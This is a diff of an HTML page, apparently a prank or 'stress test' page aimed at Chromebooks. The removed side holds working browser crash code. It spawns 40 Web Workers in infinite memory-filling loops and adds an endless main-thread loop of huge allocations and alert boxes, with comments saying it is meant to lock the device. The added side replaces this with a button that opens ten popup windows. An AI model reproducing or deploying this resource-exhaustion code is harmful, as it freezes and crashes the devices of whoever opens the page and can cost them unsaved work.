@@ -1,42 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>EaglercraftX Ultra Stress</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
-        #warning { color: red; font-weight: bold; font-size: 2em; }
-        button { background: red; color: white; padding: 30px; font-size: 20px; border: none; cursor: pointer; }
-    </style>
+    <title>弹窗测试</title>
 </head>
 <body>
-    <div id="warning">SYSTEM STRESS TEST - FULL POWER</div>
-    <p>如果你的 Chromebook 性能太强，这个脚本会尝试开启多线程锁死 CPU。</p>
-    <button onclick="totalMeltdown()">点此彻底干爆</button>
+    <button onclick="popMany()">点我弹出10个窗口</button>
 
     <script>
-        function totalMeltdown() {
-            // 1. 弹出无数个窗口 (如果没被拦截，系统瞬间崩溃)
-            // 2. 开启 Web Workers 占据所有 CPU 核心
-            const blobCode = `
-                while(true) {
-                    let x = Math.random() * Math.random();
-                    let arr = new Array(1000000).fill("CRASH_MEMORY_FILL");
-                }
-            `;
-            const blob = new Blob([blobCode], {type: 'application/javascript'});
-            const workerUrl = URL.createObjectURL(blob);
-
-            // 根据你的 CPU 核心数开启 20 倍的后台线程
-            for (let i = 0; i < 40; i++) {
-                new Worker(workerUrl);
-            }
-
-            // 3. 主线程死循环 + 无限弹窗
-            while (true) {
-                console.log("Allocating...");
-                let crash = new Array(1000000).fill(document.body.innerHTML);
-                // 尝试开启弹窗（Chromebook 遇到无限弹窗通常会直接卡死界面）
-                window.alert("系统即将过载！点击确定也没用");
+        function popMany() {
+            // 循环10次
+            for (let i = 0; i < 10; i++) {
+                // 打开一个 300x300 的新窗口
+                window.open('https://www.google.com', '_blank', 'width=300,height=300');
             }
         }
     </script>
